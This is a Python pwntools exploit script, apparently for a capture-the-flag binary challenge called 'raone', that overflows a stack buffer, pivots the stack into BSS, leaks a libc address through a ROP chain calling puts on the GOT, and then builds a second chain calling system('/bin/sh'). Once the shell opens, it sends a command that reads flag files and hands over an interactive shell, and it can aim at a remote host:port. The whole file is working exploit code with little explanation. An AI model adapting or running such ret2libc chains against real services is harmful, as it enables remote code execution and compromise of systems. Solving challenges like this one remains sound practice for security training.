from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

# Binary addresses (no PIE)
pop_rdi    = 0x4011db
leave_ret  = 0x40123b
main_addr  = 0x4011dd
puts_plt   = 0x401060
puts_got   = 0x404000
read_again = 0x401211

# libc offsets (Ubuntu 24.04, glibc 2.39)
PUTS_OFF   = 0x87be0
SYSTEM_OFF = 0x58750
BINSH_OFF  = 0x1cb42f

# BSS pivot addresses
BSS1 = 0x404808
BSS2 = 0x404e00

def exploit():
    if args.REMOTE:
        host, port = args.REMOTE.split(':')
        p = remote(host, int(port))
    else:
        p = process('./challenges/raone/deploy/deploy/chall')

    p.recvuntil(b"RAO only once.")

    # ===== Stage 1: Leak libc =====

    # Iter 1: pivot RBP to BSS1, jump to read_again
    payload1  = b"A" * 48 + p64(BSS1) + p64(read_again)
    p.send(payload1)

    # Iter 2: double-leave ROP chain in BSS1 area
    # read fills [BSS1-0x30 .. BSS1+0x10)
    # Double leave pivots RSP to BSS1-0x20 for ROP execution
    payload2  = p64(0)              # [BSS1-0x30] pad
    payload2 += p64(0)              # [BSS1-0x28] fake rbp (second leave pops)
    payload2 += p64(pop_rdi)        # [BSS1-0x20] pop rdi; ret
    payload2 += p64(puts_got)       # [BSS1-0x18] arg
    payload2 += p64(puts_plt)       # [BSS1-0x10] puts(puts@GOT)
    payload2 += p64(main_addr)      # [BSS1-0x08] return to main
    payload2 += p64(BSS1 - 0x28)    # [BSS1+0x00] saved_RBP -> pivot
    payload2 += p64(leave_ret)      # [BSS1+0x08] leave;ret
    p.send(payload2)

    # Parse leak
    p.recvuntil(b"Bye~~")
    p.recvuntil(b"Bye~~")
    p.recvline()
    leak_line = p.recvline()
    puts_leak = u64(leak_line.strip().ljust(8, b'\x00'))
    libc_base = puts_leak - PUTS_OFF
    system    = libc_base + SYSTEM_OFF
    bin_sh    = libc_base + BINSH_OFF
    log.success(f"libc base: {hex(libc_base)}")

    # ===== Stage 2: system("/bin/sh") =====

    p.recvuntil(b"RAO only once.")

    # Iter 3: pivot to BSS2
    payload3  = b"B" * 48 + p64(BSS2) + p64(read_again)
    p.send(payload3)

    # Iter 4: shell ROP chain
    payload4  = p64(0)              # [BSS2-0x30] pad
    payload4 += p64(0)              # [BSS2-0x28] fake rbp
    payload4 += p64(pop_rdi)        # [BSS2-0x20] pop rdi
    payload4 += p64(bin_sh)         # [BSS2-0x18] "/bin/sh"
    payload4 += p64(system)         # [BSS2-0x10] system
    payload4 += p64(0)              # [BSS2-0x08] (don't care)
    payload4 += p64(BSS2 - 0x28)    # [BSS2+0x00] saved_RBP
    payload4 += p64(leave_ret)      # [BSS2+0x08] leave;ret
    p.send(payload4)

    time.sleep(0.3)
    p.sendline(b"cat /home/*/flag 2>/dev/null; cat flag 2>/dev/null; echo FLAG_DONE")
    p.recvuntil(b"FLAG_DONE")

    p.interactive()

if __name__ == '__main__':
    exploit()
